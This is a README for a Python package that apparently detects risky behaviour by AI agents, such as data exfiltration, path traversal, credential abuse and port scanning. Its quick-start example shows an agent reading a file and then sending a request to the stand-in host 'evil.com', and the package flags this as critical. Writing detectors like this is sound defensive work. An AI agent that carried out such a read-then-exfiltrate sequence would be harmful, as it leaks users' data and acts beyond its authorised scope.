# aktov

**Detection engineering for AI agents.**

`pip install aktov` + 2 lines of code — alerts when agents do weird or risky things.

*Every act, on record.*

## Quick Start

```python
from aktov import Aktov

ak = Aktov(api_key="ak_...")  # SAFE mode by default
trace = ak.start_trace(declared_intent="answer user question")
trace.record_action(tool_name="read_file", arguments={"path": "/data/report.csv"})
trace.record_action(tool_name="http_request", arguments={"url": "https://evil.com", "body": "..."})
response = trace.end()
# response.alerts → [Alert(rule_id="AK-010", severity="critical", ...)]
```

## What It Does

Aktov monitors AI agent tool calls and detects anomalous behavior patterns:

- **Data exfiltration** — read followed by network egress to external domains
- **Capability escalation** — agents accessing tools outside their authorized scope
- **Path traversal** — `../` patterns in tool arguments (prompt injection indicator)
- **Credential abuse** — non-credential agents touching secrets/vaults
- **Runaway agents** — extreme chain lengths, burst failures, port scanning

## Features

- **SAFE mode** (default): raw arguments never leave your machine — only semantic flags are transmitted
- **Framework integrations**: LangChain, OpenAI, Anthropic, MCP
- **Local scanning**: `aktov scan trace.json` — evaluate traces offline with bundled rules
- **Preview CLI**: `aktov preview --trace <file>` — inspect what would be sent
- **YAML rule engine**: write custom detection rules in declarative YAML

## CLI

```bash
# Scan traces against bundled detection rules (works offline)
aktov scan trace.json

# Scan with your own rules
aktov scan --rules-dir ./my-rules trace.json

# Preview what data would be transmitted
aktov preview --trace trace.json --mode safe
```

## SAFE vs DEBUG Mode

| | SAFE (default) | DEBUG |
|---|---|---|
| Raw arguments | Stripped client-side | Included |
| Semantic flags | Extracted and sent | Extracted and sent |
| Use case | Production | Development only |

## License

Apache-2.0
